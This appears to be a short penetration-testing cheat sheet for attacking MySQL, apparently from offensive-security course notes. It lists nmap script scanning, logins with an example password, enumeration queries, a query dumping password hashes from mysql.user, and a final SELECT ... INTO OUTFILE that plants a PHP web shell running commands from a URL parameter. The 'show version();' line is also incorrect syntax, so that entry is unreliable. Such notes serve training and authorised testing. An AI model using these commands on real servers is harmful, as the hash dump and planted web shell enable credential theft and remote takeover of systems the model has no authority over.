### MySQL Script Scan

```bash
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```

### Login as a `mysql` user

```mysql
mysql -h 172.19.0.3 -u username -p Password1! 
mysql --host=172.19.0.3 --user=username --password=Password1!
```

### Show all databases

```mysql
show databases;
```

### Selecting information

```mysql
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```

### Show version of `MySQL`

```mysql
show version();
```

### Show current user

```mysql
select system_user();
```

### Writing into an outfile

```mysql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```